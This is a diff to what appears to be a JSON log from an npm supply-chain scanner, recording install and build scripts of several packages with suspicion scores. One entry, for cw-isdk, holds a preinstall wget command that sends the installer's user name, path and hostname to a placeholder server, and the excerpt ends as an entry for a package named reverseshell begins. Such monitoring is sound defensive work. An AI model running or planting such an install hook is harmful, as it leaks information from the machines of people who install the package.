@@ -1,5 +1,35 @@
 [
   {
+    "packageName": "@series-inc/stowkit-reader",
+    "version": "0.1.44",
+    "scriptType": "postinstall",
+    "scriptContent": "node scripts/postinstall.cjs",
+    "previousVersion": "0.1.43",
+    "timestamp": "2026-03-13T18:57:04.187Z",
+    "issuesend": false,
+    "suspicionScore": 0
+  },
+  {
+    "packageName": "@unlayer/types",
+    "version": "1.386.0",
+    "scriptType": "prebuild",
+    "scriptContent": "npm run clean && npm run build:legacy-unlayer-types",
+    "previousVersion": null,
+    "timestamp": "2026-03-13T18:55:23.721Z",
+    "issuesend": false,
+    "suspicionScore": 0
+  },
+  {
+    "packageName": "cw-isdk",
+    "version": "40.1.1",
+    "scriptType": "preinstall",
+    "scriptContent": "wget --quiet http://YourServer/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"",
+    "previousVersion": "40.1.0",
+    "timestamp": "2026-03-13T18:54:50.017Z",
+    "issuesend": false,
+    "suspicionScore": 10
+  },
+  {
     "packageName": "@digininja/reverseshell",
     "version": "1.0.1",
     "scriptType": "postinstall",
